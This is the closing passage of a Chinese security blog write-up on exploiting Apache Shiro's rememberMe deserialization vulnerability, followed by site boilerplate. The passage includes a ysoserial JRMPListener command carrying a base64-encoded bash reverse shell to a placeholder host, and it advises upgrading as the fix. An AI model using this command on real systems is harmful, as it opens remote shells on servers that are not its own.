+<h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><p>linux更换下反弹shell的命令即可，命令要<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="external">编码</a>下：</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-exp-03.png" alt="parse-exp-03"></p>
+<p>最终如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 7778 CommonsCollections4 <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9uY2lwLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span></div></pre></td></tr></table></figure></p>
+<h3 id="不能出网"><a href="#不能出网" class="headerlink" title="不能出网"></a>不能出网</h3><p>不能出网当然是用回显啦，如下：</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-exp-04.png" alt="parse-exp-03"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级至最新版本</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>穷困潦倒的安全工作者，如果文章对您有所帮助，可以选择性打赏。</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/WeChatQR.JPG" alt="lyxhh 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lyxhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/" title="Apache Shiro 反序列化之殇">http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/09/android-ssl-shuangxiang/" rel="next" title="app双向校验 && 快速定位bypass">
+                <i class="fa fa-chevron-left"></i> app双向校验 && 快速定位bypass
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/08/03/fastjsonparse/" rel="prev" title="fastjsonparse">
+                fastjsonparse <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="lyxhh" />
+            
+              <p class="site-author-name" itemprop="name">lyxhh</p>
+              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">2.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#机器能出网情况"><span class="nav-number">5.1.</span> <span class="nav-text">机器能出网情况</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#检测"><span class="nav-number">5.1.1.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用"><span class="nav-number">5.1.2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#windows"><span class="nav-number">5.1.2.1.</span> <span class="nav-text">windows</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#linux"><span class="nav-number">5.1.2.2.</span> <span class="nav-text">linux</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不能出网"><span class="nav-number">5.2.</span> <span class="nav-text">不能出网</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复建议"><span class="nav-number">6.</span> <span class="nav-text">修复建议</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyxhh</span>
+
+  
+</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
